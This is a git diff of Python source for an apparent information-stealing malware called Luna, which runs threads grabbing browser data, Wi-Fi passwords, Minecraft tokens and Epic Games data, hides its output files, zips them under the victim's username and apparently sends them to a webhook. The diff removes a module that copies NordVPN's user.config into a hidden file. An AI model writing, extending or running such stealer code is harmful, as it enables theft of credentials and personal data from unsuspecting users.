@@ -37,7 +37,7 @@ def main(webhook: str):
     get_inf()
     grabtokens()
 
-    threads = [ss, chrome, grabwifi, mc_tokens, epicgames_data, grabnordvpn]
+    threads = [ss, chrome, grabwifi, mc_tokens, epicgames_data]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -554,26 +554,6 @@ class epicgames_data():
             else:
                 g.write("No epic games data was found :(")
         hide(".\\epicgames-data.txt")
-
-@try_extract
-class grabnordvpn():
-    def __init__(self):
-        self.local = os.getenv("localappdata")
-        self.nord = self.local + \
-            "\\NordVPN\\NordVPN.exe_Path_ocgnpsstpzc4lj3yc2lnr1cf1hyyhdd5\\6.35.9.0\\user.config"
-
-        self.get_data()
-
-    def get_data(self):
-        with open((".\\nordvpn-data.txt"), 'w', encoding="cp437", errors='ignore') as f:
-            f.write("https://github.com/Smug246 | Nord VPN Data\n\n")
-            if os.path.exists(self.nord):
-                with open(self.nord, 'r') as n:
-                    f.write(n.read())
-
-            else:
-                f.write(f"No nord vpn data was found :(")
-        hide(".\\nordvpn-data.txt")
 
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
